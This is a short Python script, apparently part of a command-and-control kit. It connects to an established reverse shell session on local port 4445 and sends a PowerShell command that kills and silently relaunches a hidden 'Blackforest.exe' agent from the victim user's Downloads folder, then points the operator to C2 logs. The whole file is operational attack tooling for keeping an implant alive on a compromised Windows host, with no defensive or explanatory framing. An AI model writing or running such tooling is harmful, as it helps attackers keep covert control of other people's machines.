#!/usr/bin/env python3
"""
Use existing reverse shell to restart agent
"""
import socket
import time

def restart_agent():
    print("[*] Connecting to C2 Shell Session...")
    
    # The reverse shell is already connected, we just send commands
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    
    try:
        # Connect to one of the existing shell sessions
        sock.connect(('127.0.0.1', 4445))
        time.sleep(1)
        
        # Read any initial data
        try:
            data = sock.recv(4096)
            print(f"[+] Connected: {data[:100].decode('utf-8', errors='ignore')}")
        except:
            pass
        
        # Send restart command
        print("\n[*] Sending restart command...")
        cmd = "Stop-Process -Name Blackforest -Force -ErrorAction SilentlyContinue; Start-Sleep -Seconds 2; Start-Process \"$env:USERPROFILE\\Downloads\\Blackforest.exe\" -WindowStyle Hidden\n"
        sock.sendall(cmd.encode())
        
        time.sleep(3)
        
        # Check output
        try:
            response = sock.recv(4096).decode('utf-8', errors='ignore')
            print(f"[*] Response: {response}")
        except:
            pass
        
        sock.close()
        
        print("\n[+] Command sent!")
        print("[+] Agent should restart in 2-3 seconds...")
        print("[*] Watch for new '[*] Blackforest Agent Started' in logs")
        print("[*] Monitor: tail -f c2/blackforest_logs.txt")
        return True
        
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

if __name__ == "__main__":
    restart_agent()
